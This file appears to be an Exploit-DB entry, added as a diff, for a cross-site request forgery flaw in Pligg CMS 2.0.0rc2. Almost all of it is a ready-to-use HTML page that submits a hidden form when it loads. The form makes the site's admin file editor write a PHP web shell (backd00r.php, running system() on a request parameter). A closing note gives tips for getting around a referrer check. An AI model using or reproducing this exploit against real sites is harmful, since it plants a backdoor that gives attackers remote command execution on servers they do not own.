@@ -1,0 +1,24 @@
+---------------------------------------------------
+# Exploit Title: Pligg CMS - CSRF Vulnerability
+# Author: DaOne
+# Vendor Homepage: http://pligg.com/
+# Download link: https://github.com/Pligg/pligg-cms/archive/2.0.0rc2.zip
+# Category: webapps/php
+# Version: 2.0.0rc2 + old versions
+---------------------------------------------------
+
+-Create File by CSRF Exploit-
+<html>
+<body onload="document.form.submit();">
+<form action="http://[target]/pligg/admin/admin_editor.php" method="post" name="form">
+<input type="hidden" name="updatedfile" value="<?php system($_REQUEST['cmd']); ?>">
+<input type="hidden" name="the_file2" value="/var/www/html/pligg/backd00r.php">
+<input type="hidden" name="isempty" value="1">
+<input type="hidden" name="save" value="Save+Changes">
+</form>
+</body>
+</html>
+
+# Exploit-DB Note:
+# If getting a Wrong Referrer error, use Live HTTP Headers or Tamper Date plugin
+# to mitigate the issue.
